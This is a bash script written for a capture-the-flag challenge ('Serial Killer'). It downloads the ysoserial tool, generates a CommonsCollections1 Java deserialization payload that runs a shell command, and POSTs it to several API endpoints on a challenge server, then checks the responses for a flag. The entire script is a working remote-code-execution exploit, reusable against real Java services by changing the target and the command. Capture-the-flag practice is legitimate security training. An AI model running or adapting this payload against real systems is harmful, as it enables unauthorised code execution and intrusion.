#!/bin/bash

# Serial Killer Challenge - Exploitation Script
# Generates and sends Java deserialization payloads to vulnerable endpoints

set -e

echo "=== Serial Killer - Java Deserialization Exploit ==="
echo ""

# Configuration
TARGET_URL="https://poiuytrewqazxcv-csc26.cybersecuritychallenge.al"
YSOSERIAL_JAR="/tmp/ysoserial.jar"
PAYLOAD_FILE="/tmp/exploit_payload.b64"

# Color codes for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
NC='\033[0m' # No Color

# Check if ysoserial exists
if [ ! -f "$YSOSERIAL_JAR" ]; then
    echo -e "${YELLOW}[*] Downloading ysoserial...${NC}"
    wget -q https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar \
        -O "$YSOSERIAL_JAR"
    echo -e "${GREEN}[+] ysoserial downloaded${NC}"
fi

# Generate payload
echo -e "${YELLOW}[*] Generating CommonsCollections1 payload...${NC}"
java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED \
     --add-opens java.base/java.lang=ALL-UNNAMED \
     -jar "$YSOSERIAL_JAR" CommonsCollections1 'id' 2>/dev/null | base64 -w0 > "$PAYLOAD_FILE"

if [ ! -s "$PAYLOAD_FILE" ]; then
    echo -e "${RED}[-] Failed to generate payload${NC}"
    exit 1
fi

echo -e "${GREEN}[+] Payload generated ($(wc -c < $PAYLOAD_FILE) bytes)${NC}"
echo ""

# Send to all endpoints
ENDPOINTS=("/api/session" "/api/config" "/api/cache")

for endpoint in "${ENDPOINTS[@]}"; do
    echo -e "${YELLOW}[*] Testing endpoint: $endpoint${NC}"
    
    response=$(curl -s -X POST \
        -H "Content-Type: application/json" \
        -d "{\"data\":\"$(cat $PAYLOAD_FILE)\"}" \
        "$TARGET_URL$endpoint")
    
    # Check if flag is in response
    if echo "$response" | grep -q "CSC26{"; then
        echo -e "${GREEN}[+] SUCCESS! Flag found:${NC}"
        echo "$response" | grep -o 'CSC26{[^}]*}' | head -1
        echo ""
        echo "Full response:"
        echo "$response" | python3 -m json.tool 2>/dev/null || echo "$response"
        echo ""
    else
        echo -e "${RED}[-] No flag in response${NC}"
        echo "Response: $response"
        echo ""
    fi
done

echo -e "${GREEN}[+] Exploitation complete${NC}"
